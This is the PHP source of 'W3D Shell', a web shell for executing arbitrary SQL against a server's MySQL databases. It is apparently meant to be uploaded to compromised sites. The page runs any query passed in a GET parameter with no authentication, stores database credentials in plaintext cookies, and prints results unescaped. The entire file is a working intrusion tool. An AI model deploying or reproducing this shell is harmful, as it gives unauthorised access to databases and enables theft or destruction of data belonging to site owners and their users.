<?php
/*
W3D Shell
By: Warpboy
www.private-node.net
Version: 0x01
Info: Created specifically for straight-foreward SQL interaction.
Planned updates: More features, easier interaction with database(s)
*/

//Store User Input
$user = $_POST['user'];
$pass = $_POST['pass'];
$dbn = $_POST['db'];
$host = "localhost";

//Comprehend Change
if($_REQUEST['change']) {
setcookie("user", "$user", time()+3600);
setcookie("pass", "$pass", time()+3600);
setcookie("db", "$dbn", time()+3600);
}
//Define cookies in vars
$username = $_COOKIE["user"];
$password = $_COOKIE["pass"];
$database = $_COOKIE["db"];

//build header
echo '<title>W3D Shell // By: Warpboy \\\ SQL Shell</title>';
echo '
<font color=#00CC00><body bgcolor=black>
<center><table border=0 cellpadding=0 cellspacing=0 width=50% style=font-size: 14px; font-family: Arial;>
<tr><td bgcolor=#00CC00><center><font size="3" face="Verdana"><b>W3D SQL Shell</font></tr></td>
<tr><td><font color=#FFFFFF><center><b><font size="1" face="Georgia"><marquee speed=1>By: Warpboy</td></font></tr>
';
echo '
<tr><td><font color=#00CC00><center><b><br>[]Database Info[]</td></tr><tr><td><font color=#FFFFFF><b><pre><br>
<center>
<form action="w3d.php" method="post">
Username: <input type="text" name="user" </input>
Password: <input type="text" name="pass" />
Database: <input type="text" name="db" />
<input type="submit" value="Change" name="change"  />
</form>    </tr></td><table>
';
echo '
<form action="w3d.php" method="get">
<b><font color=#00CC00><br>Query:</font></b> <input type="text" name="query" size="65"/>
<input type="submit"  />
</form>';

//Initial pre-cookie
$con = @mysql_connect($host, $user, $pass);
if (!$con){
 //secondary post-cookie
 $con1 = @mysql_connect($host, $username, $password);
 if(!$con1) {
 echo "<br><b><font color=#00CC00>Currently not connected.<br>";
 }
 }

//Notify user of current connection
if($_REQUEST['change'] && $user != '') {
echo "<br><b><font color=#00CC00>Connected to MySQL as user</font>" . "<font color=red> $user</b></font>";
}
if(!$_REQUEST['change'] && $username != '') {
echo "<br><b><font color=#00CC00>Connected to MySQL as user</font>" . "<font color=red> $username</b></font>";
}

//Database Time
//initial pre-cookie
$db_c = @mysql_select_db($dbn,$con);
if(!$db_c) {
//secondary post-cookie
$db_d = @mysql_select_db($database,$con1);
if(!$db_d) {
if(isset($database) || isset($dbn)) {
echo "<br><font color=#00CC00><b>Unable to access database!";
}
}
}
//query function
query();

function query() {
$query = $_GET['query'];
if($query == '') {
echo "<br><font color=#00CC00><b>No Query Executed</b></font>";
}
else {
//Query Time
$query1 = str_replace("\\", " ", $query);
$result = @mysql_query("$query1");
echo "<br><b><font color=#00CC00>Query Results: <br /></b></font> ";
        echo "<table border=1 cellpadding=0 cellspacing=0 width=100% style=\"font-size: 14px; font-family: Trebuchet;\">
                <tr bgcolor=white align=center style=\"font-weight: bold;\">\n";

$rr = @mysql_num_fields($result);
                for($kz=0; $kz<$rr; $kz++)
                {
                        $ee = @mysql_field_name($result,$kz);
                        echo "<td bgcolor=#FFFFFF>$ee</td>";
                }
                echo "</tr>\n";

                $vv = true;
                while ($line = @mysql_fetch_array($result, MYSQL_ASSOC)) {
                        if($vv === true){
                        echo "<tr align=center bgcolor=#00CC00>\n";
                        $vv = false;
                        }
                        else{
                        echo "<tr align=center bgcolor=#00CC00>\n";
                        $vv = true;
                        }
                        foreach ($line as $col_value) {
                echo "<td>$col_value</td>\n";
                        }
                echo "</tr>\n";
                }
                echo "</table>\n";

                @mysql_free_result($result);

}
}

?>
